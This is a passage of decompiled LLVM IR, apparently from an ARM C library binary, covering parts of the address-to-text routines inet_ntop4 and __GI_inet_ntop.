  %v1_1aeb0 = add i32 %v0_1aeb0, 1
  store i32 %v1_1aeb0, i32* %r2.global-to-local, align 4
  %v7_1aeb4 = icmp slt i32 %v1_1aea8, %v0_1aeb0
  br i1 %v7_1aeb4, label %dec_label_pc_1aeb8, label %dec_label_pc_1ae94

dec_label_pc_1aeb8:                               ; preds = %dec_label_pc_1aea4
  store i32 %v0_1aeb8, i32* @r4, align 4
  br label %dec_label_pc_1aebc

dec_label_pc_1aebc:                               ; preds = %dec_label_pc_1ae78, %dec_label_pc_1aeb8
  %v0_1aebc = phi i32 [ %v0_1aeb8, %dec_label_pc_1aeb8 ], [ %v0_1aebc.pre, %dec_label_pc_1ae78 ]
  %v1_1aebc = phi i32 [ %v0_1aeb8, %dec_label_pc_1aeb8 ], [ %v1_1aebc.pre, %dec_label_pc_1ae78 ]
  %v9_1aebc = icmp eq i32 %v0_1aebc, %v1_1aebc
  br i1 %v9_1aebc, label %dec_label_pc_1aec4, label %dec_label_pc_1aef0

dec_label_pc_1aec4:                               ; preds = %dec_label_pc_1aebc
  store i32 16, i32* @r2, align 4
  %v2_1aec8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_1aec8, i32* @r0, align 4
  store i32 %v2_1ad2c, i32* @r1, align 4
  %v0_1aed0 = call i32 @memcpy()
  store i32 %v0_1aed0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aef4

dec_label_pc_1aedc:                               ; preds = %dec_label_pc_1ad0c
  %v0_1aedc = call i32 @__errno_location()
  store i32 %v0_1aedc, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1aee8 = inttoptr i32 %v0_1aedc to i32*
  store i32 97, i32* %v2_1aee8, align 4
  %v0_1aef4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aef4

dec_label_pc_1aef0:                               ; preds = %dec_label_pc_1ad8c, %dec_label_pc_1adb4, %dec_label_pc_1add4, %dec_label_pc_1adc8, %dec_label_pc_1ae18, %dec_label_pc_1ae80, %dec_label_pc_1ae04, %dec_label_pc_1aebc, %dec_label_pc_1ad50, %dec_label_pc_1ae58, %dec_label_pc_1ae0c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aef4

dec_label_pc_1aef4:                               ; preds = %dec_label_pc_1aedc, %dec_label_pc_1aec4, %dec_label_pc_1ad18, %dec_label_pc_1aef0
  %v0_1aef4 = phi i32 [ %v0_1aef4.pre, %dec_label_pc_1aedc ], [ 1, %dec_label_pc_1aec4 ], [ %v4_1ad20, %dec_label_pc_1ad18 ], [ 0, %dec_label_pc_1aef0 ]
  store i32 %v0_1aef4, i32* %r0.global-to-local, align 4
  store i32 %v3_1acf4, i32* @r4, align 4
  store i32 %v6_1acf4, i32* @r5, align 4
  store i32 %v9_1acf4, i32* @r6, align 4
  ret i32 %v0_1aef4

; uselistorder directives
  uselistorder i32 %v0_1aef4, { 1, 0 }
  uselistorder i32 %v2_1aeac, { 1, 0 }
  uselistorder i32 %v2_1aea8, { 1, 0 }
  uselistorder i32 %v0_1aeb0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1aeb8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1aebc.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1aebc.pre, { 2, 0, 1 }
  uselistorder i32 %v3_1ae68, { 1, 0 }
  uselistorder i32 %v0_1aebc.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1ae40, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1ae1c, { 1, 0 }
  uselistorder i32 %v3_1ade0, { 1, 0 }
  uselistorder i32 %v0_1add4, { 1, 0, 2 }
  uselistorder i32 %v1_1ad84, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1ad7c, { 1, 0 }
  uselistorder i32 %v0_1ad60, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 7, 5, 6, 13, 12, 9, 8, 11, 10, 2, 1, 14, 16, 15, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32)* @__GI_tolower, { 1, 0 }
  uselistorder label %dec_label_pc_1aef4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1aef0, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_1aebc, { 1, 0 }
  uselistorder label %dec_label_pc_1aea4, { 1, 0 }
  uselistorder label %dec_label_pc_1ae78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1ae3c.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1ad70, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1af04 = load i32, i32* @r4, align 4
  store i32 %v3_1af04, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_1eae0.1043 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_1af20 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_1af20, i32* @r0, align 4
  %v0_1af24 = call i32 @memcpy()
  %v2_1af28 = ptrtoint i32* %stack_var_-51 to i32
  store i32 %v2_1af28, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 15, i32* @r2, align 4
  %v0_1af34 = call i32 @__GI_memset()
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1affc = ptrtoint i32* %stack_var_-36 to i32
  %v2_1afd8 = add i32 %v2_1affc, -17
  br label %dec_label_pc_1affc

dec_label_pc_1af44:                               ; preds = %dec_label_pc_1affc
  %v0_1af44 = load i32, i32* %fp.global-to-local, align 4
  %v2_1af44 = add i32 %v0_1af44, %v1_1af44
  %v3_1af44 = inttoptr i32 %v2_1af44 to i8*
  %v4_1af44 = load i8, i8* %v3_1af44, align 1
  %v6_1af44 = zext i8 %v4_1af44 to i32
  store i32 %v6_1af44, i32* %r4.global-to-local, align 4
  %v1_1af48 = add i32 %v0_1af48, 1
  store i32 %v1_1af48, i32* %r7.global-to-local, align 4
  store i32 %v2_1affc, i32* %r2.global-to-local, align 4
  %v2_1af54 = add i32 %v1_1af48, %v2_1affc
  store i32 %v2_1af54, i32* %sl.global-to-local, align 4
  %div = udiv i8 %v4_1af44, 100
  %v1_1af5c = or i8 %div, 48
  %v3_1af60 = add i32 %v2_1b00c, -17
  %v4_1af60 = inttoptr i32 %v3_1af60 to i8*
  store i8 %v1_1af5c, i8* %v4_1af60, align 1
  %v0_1af64 = load i32, i32* %r5.global-to-local, align 4
  %v1_1af64 = add i32 %v0_1af64, -17
  %v2_1af64 = inttoptr i32 %v1_1af64 to i8*
  %v3_1af64 = load i8, i8* %v2_1af64, align 1
  %v7_1af68 = icmp eq i8 %v3_1af64, 48
  %v0_1af6c = load i32, i32* %fp.global-to-local, align 4
  %v1_1af6c = load i32, i32* %r8.global-to-local, align 4
  %v2_1af6c = add i32 %v1_1af6c, %v0_1af6c
  store i32 %v2_1af6c, i32* %sb.global-to-local, align 4
  %v0_1af74 = load i32, i32* %r4.global-to-local, align 4
  %v2_1af7c = udiv i32 %v0_1af74, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1af84 = urem i32 %v2_1af7c, 256
  %v2_1af88 = urem i32 %v1_1af84, 10
  %v1_1af8c = or i32 %v2_1af88, 48
  %v1_1af90 = trunc i32 %v1_1af8c to i8
  br i1 %v7_1af68, label %dec_label_pc_1af7c, label %dec_label_pc_1afa4

dec_label_pc_1af7c:                               ; preds = %dec_label_pc_1af44
  store i8 %v1_1af90, i8* %v2_1af64, align 1
  %v0_1af94 = load i32, i32* %r5.global-to-local, align 4
  %v1_1af94 = add i32 %v0_1af94, -17
  %v2_1af94 = inttoptr i32 %v1_1af94 to i8*
  %v3_1af94 = load i8, i8* %v2_1af94, align 1
  %v7_1af98 = icmp eq i8 %v3_1af94, 48
  br i1 %v7_1af98, label %dec_label_pc_1af7c.dec_label_pc_1afc8_crit_edge, label %bb

dec_label_pc_1af7c.dec_label_pc_1afc8_crit_edge:  ; preds = %dec_label_pc_1af7c
  %v1_1afd8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1afc8

bb:                                               ; preds = %dec_label_pc_1af7c
  %v1_1af9c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1af9c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1afc8

dec_label_pc_1afa4:                               ; preds = %dec_label_pc_1af44
  %v2_1afc0 = load i32, i32* %sl.global-to-local, align 4
  %v3_1afc0 = add i32 %v2_1afc0, -17
  %v4_1afc0 = inttoptr i32 %v3_1afc0 to i8*
  store i8 %v1_1af90, i8* %v4_1afc0, align 1
  %v0_1afc4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1afc4 = add i32 %v0_1afc4, 1
  store i32 %v1_1afc4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1afc8

dec_label_pc_1afc8:                               ; preds = %dec_label_pc_1af7c.dec_label_pc_1afc8_crit_edge, %bb, %dec_label_pc_1afa4
  %v1_1afd8 = phi i32 [ %v1_1afd8.pre, %dec_label_pc_1af7c.dec_label_pc_1afc8_crit_edge ], [ %v1_1af9c, %bb ], [ %v1_1afc4, %dec_label_pc_1afa4 ]
  %v0_1afc8 = load i32, i32* %sb.global-to-local, align 4
  %v1_1afc8 = inttoptr i32 %v0_1afc8 to i8*
  %v2_1afc8 = load i8, i8* %v1_1afc8, align 1
  %tmp17 = urem i8 %v2_1afc8, 10
  store i32 %v2_1affc, i32* %ip.global-to-local, align 4
  %v1_1afdc = add i32 %v1_1afd8, 1
  store i32 %v1_1afdc, i32* %r1.global-to-local, align 4
  %v1_1afe0 = or i8 %tmp17, 48
  %v3_1afe4 = add i32 %v2_1afd8, %v1_1afd8
  %v4_1afe4 = inttoptr i32 %v3_1afe4 to i8*
  store i8 %v1_1afe0, i8* %v4_1afe4, align 1
  %v0_1afe8 = load i32, i32* %ip.global-to-local, align 4
  %v1_1afe8 = load i32, i32* %r1.global-to-local, align 4
  %v2_1afe8 = add i32 %v1_1afe8, %v0_1afe8
  store i32 %v2_1afe8, i32* %r2.global-to-local, align 4
  %v3_1aff0 = add i32 %v2_1afe8, -17
  %v4_1aff0 = inttoptr i32 %v3_1aff0 to i8*
  store i8 46, i8* %v4_1aff0, align 1
  %v0_1aff4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1aff4 = add i32 %v0_1aff4, 1
  store i32 %v1_1aff4, i32* %r8.global-to-local, align 4
  %v0_1aff8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1aff8 = add i32 %v0_1aff8, 1
  br label %dec_label_pc_1affc

dec_label_pc_1affc:                               ; preds = %entry, %dec_label_pc_1afc8
  %v0_1af48 = phi i32 [ 0, %entry ], [ %v1_1aff8, %dec_label_pc_1afc8 ]
  %v1_1af44 = phi i32 [ 0, %entry ], [ %v1_1aff4, %dec_label_pc_1afc8 ]
  store i32 %v2_1affc, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_1af48, i32* %r6.global-to-local, align 4
  %v2_1b00c = add i32 %v0_1af48, %v2_1affc
  store i32 %v2_1b00c, i32* %r5.global-to-local, align 4
  %v7_1b010 = icmp sgt i32 %v1_1af44, 3
  br i1 %v7_1b010, label %dec_label_pc_1b014, label %dec_label_pc_1af44

dec_label_pc_1b014:                               ; preds = %dec_label_pc_1affc
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_1af20, i32* %r4.global-to-local, align 4
  %v3_1b01c = add i32 %v2_1b00c, -18
  %v4_1b01c = inttoptr i32 %v3_1b01c to i8*
  store i8 0, i8* %v4_1b01c, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_1b024 = call i32 @strlen(i8* %tmp18)
  %v2_1b028 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v3_1b024, %v2_1b028
  br i1 %tmp, label %dec_label_pc_1b034, label %dec_label_pc_1b048

dec_label_pc_1b034:                               ; preds = %dec_label_pc_1b014
  %v0_1b034 = call i32 @__errno_location()
  %v0_1b03c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1b03c, i32* %r2.global-to-local, align 4
  %v2_1b040 = inttoptr i32 %v0_1b034 to i32*
  store i32 28, i32* %v2_1b040, align 4
  %v0_1b058.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b058

dec_label_pc_1b048:                               ; preds = %dec_label_pc_1b014
  store i32 %v2_1af20, i32* %r1.global-to-local, align 4
  %v3_1b050 = call i32 @strcpy(i32 %arg2, i8* %tmp18)
  store i32 %v3_1b050, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b058

dec_label_pc_1b058:                               ; preds = %dec_label_pc_1b034, %dec_label_pc_1b048
  %v0_1b058 = phi i32 [ %v0_1b058.pre, %dec_label_pc_1b034 ], [ %v3_1b050, %dec_label_pc_1b048 ]
  %v2_1b060 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1b060, i32* @r4, align 4
  ret i32 %v0_1b058

; uselistorder directives
  uselistorder i32 %v2_1b00c, { 0, 2, 1 }
  uselistorder i32 %v1_1af44, { 1, 0 }
  uselistorder i32 %v0_1af48, { 0, 2, 1 }
  uselistorder i32 %v2_1affc, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 2, 3, 4, 5, 0 }
  uselistorder i32 100, { 2, 3, 0, 1 }
  uselistorder i8 10, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i8 48, { 0, 5, 6, 1, 2, 3, 4, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_1b058, { 1, 0 }
  uselistorder label %dec_label_pc_1affc, { 1, 0 }
  uselistorder label %dec_label_pc_1afc8, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1b068 = load i32, i32* @r4, align 4
  store i32 %v3_1b068, i32* %stack_var_-32, align 4
  %v6_1b068 = load i32, i32* @r5, align 4
  %v25_1b068 = ptrtoint i32* %stack_var_-32 to i32
  %v7_1b06c = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_1b06c, label %dec_label_pc_1b090, label %dec_label_pc_1b084

dec_label_pc_1b084:                               ; preds = %entry
  %v7_1b084 = icmp eq i32 %arg1, 10
  br i1 %v7_1b084, label %dec_label_pc_1b0a4, label %dec_label_pc_1b2a4

dec_label_pc_1b090:                               ; preds = %entry
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_1b09c = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1b29c

dec_label_pc_1b0a4:                               ; preds = %dec_label_pc_1b084
  store i32 0, i32* @r1, align 4
  %v2_1b0a8 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_1b0a8, i32* @r0, align 4
  store i32 32, i32* @r2, align 4
  %v0_1b0b0 = call i32 @__GI_memset()
  br label %dec_label_pc_1b0d0

dec_label_pc_1b0bc:                               ; preds = %dec_label_pc_1b0d0
  %tmp68 = icmp slt i32 %v1_1b0c0, 0
  %v4_1b0d0 = zext i1 %tmp68 to i32
  %v5_1b0d0 = add i32 %v4_1b0d0, %v1_1b0c0
  %v3_1b0d4 = sdiv i32 %v5_1b0d0, 2
  %v4_1b0e4 = mul i32 %v3_1b0d4, 4
  %v5_1b0e4 = add i32 %v4_1b0e4, %v25_1b068
  %v1_1b0bc = add i32 %v2_1b0e0, 1
  %v2_1b0bc = inttoptr i32 %v1_1b0bc to i8*
  %v3_1b0bc = load i8, i8* %v2_1b0bc, align 1
  %v4_1b0bc = zext i8 %v3_1b0bc to i32
  %v3_1b0c0 = inttoptr i32 %v2_1b0e0 to i8*
  %v4_1b0c0 = load i8, i8* %v3_1b0c0, align 1
  %v6_1b0c0 = zext i8 %v4_1b0c0 to i32
  store i32 %v6_1b0c0, i32* %r2.global-to-local, align 4
  %v4_1b0c4 = mul nuw nsw i32 %v6_1b0c0, 256
  %v5_1b0c4 = or i32 %v4_1b0c4, %v4_1b0bc
  %v2_1b0c8 = add i32 %v5_1b0e4, -32
  %v3_1b0c8 = inttoptr i32 %v2_1b0c8 to i32*
  store i32 %v5_1b0c4, i32* %v3_1b0c8, align 4
  %v0_1b0cc = load i32, i32* %r1.global-to-local, align 4
  %v1_1b0cc = add i32 %v0_1b0cc, 2
  br label %dec_label_pc_1b0d0

dec_label_pc_1b0d0:                               ; preds = %dec_label_pc_1b0a4, %dec_label_pc_1b0bc
  %v1_1b0c0 = phi i32 [ 0, %dec_label_pc_1b0a4 ], [ %v1_1b0cc, %dec_label_pc_1b0bc ]
  store i32 %v1_1b0c0, i32* %r1.global-to-local, align 4
  %v0_1b0e0 = load i32, i32* @r8, align 4
  %v2_1b0e0 = add i32 %v0_1b0e0, %v1_1b0c0
  store i32 %v2_1b0e0, i32* %r2.global-to-local, align 4
  %v7_1b0e8 = icmp sgt i32 %v1_1b0c0, 15
  br i1 %v7_1b0e8, label %dec_label_pc_1b0ec, label %dec_label_pc_1b0bc

dec_label_pc_1b0ec:                               ; preds = %dec_label_pc_1b0d0
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b0fc

dec_label_pc_1b0fc:                               ; preds = %dec_label_pc_1b0ec, %dec_label_pc_1b148
  %v0_1b13c = phi i32 [ -1, %dec_label_pc_1b0ec ], [ %v0_1b170, %dec_label_pc_1b148 ]
  %v0_1b12c = phi i32 [ -1, %dec_label_pc_1b0ec ], [ %v0_1b15c, %dec_label_pc_1b148 ]
  %v0_1b110 = phi i32 [ -1, %dec_label_pc_1b0ec ], [ %v0_1b1108, %dec_label_pc_1b148 ]
  %v0_1b148 = phi i32 [ 0, %dec_label_pc_1b0ec ], [ %v1_1b148, %dec_label_pc_1b148 ]
  %v4_1b100 = mul nuw nsw i32 %v0_1b148, 4
  %v5_1b100 = add i32 %v4_1b100, %v25_1b068
  %v1_1b104 = add i32 %v5_1b100, -32
  %v2_1b104 = inttoptr i32 %v1_1b104 to i32*
  %v3_1b104 = load i32, i32* %v2_1b104, align 4
  %v2_1b108 = icmp eq i32 %v3_1b104, 0
  %v7_1b110 = icmp eq i32 %v0_1b110, -1
  br i1 %v2_1b108, label %dec_label_pc_1b110, label %dec_label_pc_1b124

dec_label_pc_1b110:                               ; preds = %dec_label_pc_1b0fc
  br i1 %v7_1b110, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1b110
  store i32 %v0_1b148, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1b148

.thread:                                          ; preds = %dec_label_pc_1b110
  %v1_1b11c.pre = load i32, i32* @r4, align 4
  %v2_1b11c = add i32 %v1_1b11c.pre, 1
  store i32 %v2_1b11c, i32* @r4, align 4
  br label %dec_label_pc_1b148

dec_label_pc_1b124:                               ; preds = %dec_label_pc_1b0fc
  br i1 %v7_1b110, label %dec_label_pc_1b148, label %dec_label_pc_1b12c

dec_label_pc_1b12c:                               ; preds = %dec_label_pc_1b124
  %v7_1b12c = icmp eq i32 %v0_1b12c, -1
  %v0_1b140.pre = load i32, i32* @r4, align 4
  %v1_1b134 = load i32, i32* @r7, align 4
  %v7_1b138 = icmp sgt i32 %v0_1b140.pre, %v1_1b134
  %or.cond = or i1 %v7_1b12c, %v7_1b138
  br i1 %or.cond, label %dec_label_pc_1b13c, label %dec_label_pc_1b144

dec_label_pc_1b13c:                               ; preds = %dec_label_pc_1b12c
  store i32 %v0_1b13c, i32* @r6, align 4
  store i32 %v0_1b140.pre, i32* @r7, align 4
  br label %dec_label_pc_1b144

dec_label_pc_1b144:                               ; preds = %dec_label_pc_1b12c, %dec_label_pc_1b13c
  %v0_1b12c13 = phi i32 [ %v0_1b13c, %dec_label_pc_1b13c ], [ %v0_1b12c, %dec_label_pc_1b12c ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b148

dec_label_pc_1b148:                               ; preds = %bb, %.thread, %dec_label_pc_1b124, %dec_label_pc_1b144
  %v0_1b170 = phi i32 [ %v0_1b13c, %.thread ], [ %v0_1b148, %bb ], [ %v0_1b13c, %dec_label_pc_1b124 ], [ -1, %dec_label_pc_1b144 ]
  %v0_1b1108 = phi i32 [ %v0_1b110, %.thread ], [ %v0_1b148, %bb ], [ -1, %dec_label_pc_1b124 ], [ -1, %dec_label_pc_1b144 ]
  %v0_1b15c = phi i32 [ %v0_1b12c, %.thread ], [ %v0_1b12c, %bb ], [ %v0_1b12c, %dec_label_pc_1b124 ], [ %v0_1b12c13, %dec_label_pc_1b144 ]
  %v1_1b148 = add nuw nsw i32 %v0_1b148, 1
  store i32 %v1_1b148, i32* %r1.global-to-local, align 4
  %v7_1b150 = icmp slt i32 %v1_1b148, 8
  br i1 %v7_1b150, label %dec_label_pc_1b0fc, label %dec_label_pc_1b154

dec_label_pc_1b154:                               ; preds = %dec_label_pc_1b148
  %v7_1b154 = icmp eq i32 %v0_1b170, -1
  br i1 %v7_1b154, label %dec_label_pc_1b174, label %dec_label_pc_1b15c

dec_label_pc_1b15c:                               ; preds = %dec_label_pc_1b154
  %v7_1b15c = icmp eq i32 %v0_1b15c, -1
  %v0_1b16c.pre = load i32, i32* @r4, align 4
  br i1 %v7_1b15c, label %dec_label_pc_1b16c, label %dec_label_pc_1b164

dec_label_pc_1b164:                               ; preds = %dec_label_pc_1b15c
  %v1_1b164 = load i32, i32* @r7, align 4
  %v7_1b168 = icmp sgt i32 %v0_1b16c.pre, %v1_1b164
  br i1 %v7_1b168, label %dec_label_pc_1b16c, label %dec_label_pc_1b174

dec_label_pc_1b16c:                               ; preds = %dec_label_pc_1b15c, %dec_label_pc_1b164
  store i32 %v0_1b16c.pre, i32* @r7, align 4
  store i32 %v0_1b170, i32* @r6, align 4
  br label %dec_label_pc_1b174

dec_label_pc_1b174:                               ; preds = %dec_label_pc_1b164, %dec_label_pc_1b154, %dec_label_pc_1b16c
  %v0_1b174 = phi i32 [ %v0_1b15c, %dec_label_pc_1b164 ], [ %v0_1b15c, %dec_label_pc_1b154 ], [ %v0_1b170, %dec_label_pc_1b16c ]
  %v7_1b174 = icmp eq i32 %v0_1b174, -1
  br i1 %v7_1b174, label %bb49, label %dec_label_pc_1b17c

dec_label_pc_1b17c:                               ; preds = %dec_label_pc_1b174
  %v0_1b17c = load i32, i32* @r7, align 4
  %v7_1b180 = icmp slt i32 %v0_1b17c, 2
  br i1 %v7_1b180, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_1b17c
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_1b174, %dec_label_pc_1b17c, %bb48
  %v0_1b19023 = phi i32 [ %v0_1b174, %dec_label_pc_1b174 ], [ %v0_1b174, %dec_label_pc_1b17c ], [ -1, %bb48 ]
  %v2_1b184 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_1b184, i32* @r4, align 4
  %v9_1b1f0 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_1b19063 = icmp eq i32 %v0_1b19023, -1
  br label %dec_label_pc_1b190

dec_label_pc_1b190:                               ; preds = %bb49, %dec_label_pc_1b244
  %v7_1b19067 = phi i1 [ %v7_1b19063, %bb49 ], [ %v7_1b190, %dec_label_pc_1b244 ]
  %v0_1b1bc66 = phi i32 [ 0, %bb49 ], [ %v1_1b244, %dec_label_pc_1b244 ]
  %v1_1b1ac65 = phi i32 [ %v0_1b19023, %bb49 ], [ %v0_1b190.pre, %dec_label_pc_1b244 ]
  %v3_1b1c464 = phi i32 [ %v2_1b184, %bb49 ], [ %v3_1b1b424, %dec_label_pc_1b244 ]
  br i1 %v7_1b19067, label %dec_label_pc_1b1bc, label %dec_label_pc_1b198

dec_label_pc_1b198:                               ; preds = %dec_label_pc_1b190
  %v9_1b198 = icmp eq i32 %v0_1b1bc66, %v1_1b1ac65
  %v5_1b19c = icmp slt i32 %v0_1b1bc66, %v1_1b1ac65
  br i1 %v5_1b19c, label %dec_label_pc_1b1bc, label %dec_label_pc_1b1a0

dec_label_pc_1b1a0:                               ; preds = %dec_label_pc_1b198
  %v1_1b1a0 = load i32, i32* @r7, align 4
  %v2_1b1a0 = add i32 %v1_1b1a0, %v1_1b1ac65
  %v6_1b1a8 = icmp slt i32 %v0_1b1bc66, %v2_1b1a0
  br i1 %v6_1b1a8, label %dec_label_pc_1b1ac, label %dec_label_pc_1b1bc

dec_label_pc_1b1ac:                               ; preds = %dec_label_pc_1b1a0
  br i1 %v9_1b198, label %bb51, label %dec_label_pc_1b244

bb51:                                             ; preds = %dec_label_pc_1b1ac
  %v4_1b1b4 = inttoptr i32 %v3_1b1c464 to i8*
  store i8 58, i8* %v4_1b1b4, align 1
  %v5_1b1b4 = load i32, i32* @r4, align 4
  %v6_1b1b4 = add i32 %v5_1b1b4, 1
  store i32 %v6_1b1b4, i32* @r4, align 4
  br label %dec_label_pc_1b244

dec_label_pc_1b1bc:                               ; preds = %dec_label_pc_1b1a0, %dec_label_pc_1b198, %dec_label_pc_1b190
  %v2_1b1bc = icmp eq i32 %v0_1b1bc66, 0
  br i1 %v2_1b1bc, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_1b1bc
  %v4_1b1c4 = inttoptr i32 %v3_1b1c464 to i8*
  store i8 58, i8* %v4_1b1c4, align 1
  %v5_1b1c4 = load i32, i32* @r4, align 4
  %v6_1b1c4 = add i32 %v5_1b1c4, 1
  store i32 %v6_1b1c4, i32* @r4, align 4
  %v0_1b1c8.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1b1bc, %bb52
  %v0_1b208 = phi i32 [ %v3_1b1c464, %dec_label_pc_1b1bc ], [ %v6_1b1c4, %bb52 ]
  %v1_1b22c = phi i32 [ 0, %dec_label_pc_1b1bc ], [ %v0_1b1c8.pre, %bb52 ]
  %v7_1b1c8 = icmp eq i32 %v1_1b22c, 6
  br i1 %v7_1b1c8, label %dec_label_pc_1b1d0, label %dec_label_pc_1b228

dec_label_pc_1b1d0:                               ; preds = %.thread3
  %v0_1b1d0 = load i32, i32* @r6, align 4
  %v2_1b1d0 = icmp eq i32 %v0_1b1d0, 0
  br i1 %v2_1b1d0, label %dec_label_pc_1b1d8, label %dec_label_pc_1b228

dec_label_pc_1b1d8:                               ; preds = %dec_label_pc_1b1d0
  %v0_1b1d8 = load i32, i32* @r7, align 4
  %v7_1b1d8 = icmp eq i32 %v0_1b1d8, 6
  br i1 %v7_1b1d8, label %dec_label_pc_1b1f8, label %dec_label_pc_1b1e0

dec_label_pc_1b1e0:                               ; preds = %dec_label_pc_1b1d8
  %v7_1b1e0 = icmp eq i32 %v0_1b1d8, 5
  br i1 %v7_1b1e0, label %dec_label_pc_1b1e8, label %dec_label_pc_1b228

dec_label_pc_1b1e8:                               ; preds = %dec_label_pc_1b1e0
  store i32 %tmp, i32* %r2.global-to-local, align 4
